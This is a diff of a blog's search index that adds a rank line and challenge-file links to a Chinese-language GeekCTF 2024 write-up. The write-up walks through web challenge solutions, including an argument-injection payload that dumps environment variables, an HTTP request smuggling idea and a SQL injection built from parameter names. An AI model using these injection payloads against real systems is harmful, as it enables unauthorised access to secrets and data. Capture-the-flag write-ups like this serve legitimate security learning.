@@ -994,6 +994,9 @@
     <url>/2024/04/15/2024geekctf/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>经历了无数次爆零的比赛之后，终于做出来了几道题（哭</p>
 <p>题目本身并没有想象的特别难，不过质量和创新点做的非常好。</p>
+<p>最终rank：59</p>
+<img src="/2024/04/15/2024geekctf/rank.png" class="">
+
 <h2 id="Secrets"><a href="#Secrets" class="headerlink" title="Secrets"></a>Secrets</h2><p>一道关于字符串匹配的问题</p>
 <p>打开网站，查看源码，看到了一串base85加密的数据，解个密看下，工作目录都给了</p>
 <figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery">.<br>├── app.py<br>├── assets<br>│   ├── css<br>│   │   ├── pico.amber<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.azure<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.blue<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.cyan<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.fuchsia<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.green<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.grey<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.indigo<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.jade<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.lime<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.orange<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.pink<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.pumpkin<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.purple<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.red<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.sand<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.slate<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.violet<span class="hljs-built_in">.min</span>.css<br>│   │   ├── pico.yellow<span class="hljs-built_in">.min</span>.css<br>│   │   └── pico.zinc<span class="hljs-built_in">.min</span>.css<br>│   └── js<br>│       ├── color-picker.js<br>│       ├── home.js<br>│       ├── jquery-<span class="hljs-number">3.7</span>.<span class="hljs-number">1</span><span class="hljs-built_in">.min</span>.js<br>│       └── login.js<br>├── gunicorn_conf.py<br>├── populate.py<br>├── requirements.txt<br>└── templates<br>    ├── base.html<br>    ├── index.html<br>    └── login.html<br></code></pre></td></tr></table></figure>
@@ -1038,6 +1041,8 @@
 <p>发现输入jq env可以得到当前的环境变量，并且题目中提示flag在环境变量中</p>
 <p>直接出了payload：<code>json=&#123;&#125;&amp;args=%26jq&amp;args=&#39;env&#39;</code></p>
 <h2 id="PicBed（复现）"><a href="#PicBed（复现）" class="headerlink" title="PicBed（复现）"></a>PicBed（复现）</h2><p>花时间比较长的一题，最后还是没能做出来</p>
+<a href="/2024/04/15/2024geekctf/PicBed.zip" title="PicBed.zip">PicBed.zip</a>
+
 <p>给了Dockerfile，直接看一下，题目用了<code>webpsh/webp-server-go:0.11.0</code>的容器，并且给了flask的前端代码，简单看下代码，是一个文件上传和下载的图床，使用了webp进行缩小图片</p>
 <p>upload路由大体上没问题，使用随机数进行文件的重命名防止了目录穿越。</p>
 <p>关键点在于查看图片的路由，其中调用了fetch_converted_image函数对23333端口进行http请求，因为其HTTP报文直接对Accept进行了拼接，会导致一个HTTP走私，举个例子</p>
@@ -1087,6 +1092,8 @@
 <p>flag:<code>flag&#123;W0rdpr355_plu61n5_4r3_vuln3r4bl3&#125;</code></p>
 <p>遇到题一定要有耐心看下去</p>
 <h2 id="SafeBlog2（复现）"><a href="#SafeBlog2（复现）" class="headerlink" title="SafeBlog2（复现）"></a>SafeBlog2（复现）</h2><p>花时间最长的一道题，但还是没有做出来</p>
+<a href="/2024/04/15/2024geekctf/SafeBlog2.zip" title="SafeBlog2.zip">SafeBlog2.zip</a>
+
 <p>首先因为<code>NODE_NDEBUG=1</code>可以直接忽视<code>require(&#39;assert-plus&#39;)</code></p>
 <p>接下来是&#x2F;comment&#x2F;like出有一个把所有参数都注入到查询语句的查询，这里有一个注入点</p>
 <figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">正常情况  ?post_id=<span class="hljs-number">1</span><br>db.<span class="hljs-keyword">all</span>(`<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> comments <span class="hljs-keyword">WHERE</span> post_id = ?`, [&quot;1&quot;]);<br>?post_id=<span class="hljs-number">1</span>&amp;inject=<span class="hljs-number">1</span><br>db.<span class="hljs-keyword">all</span>(`<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> comments <span class="hljs-keyword">WHERE</span> post_id = ? <span class="hljs-keyword">AND</span> inject = ?`, [&quot;1&quot;, &quot;1&quot;]);<br>?post_id=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>+%<span class="hljs-number">3</span>D+%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>+<span class="hljs-keyword">OR</span>+%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>=<span class="hljs-number">1</span>   即post_id=<span class="hljs-number">1</span>&amp;   <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>   =   <span class="hljs-number">1</span><br>db.<span class="hljs-keyword">all</span>(`<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> comments <span class="hljs-keyword">WHERE</span> post_id = ? <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span> = ?`, [&quot;1&quot;, &quot;1&quot;]);<br></code></pre></td></tr></table></figure>
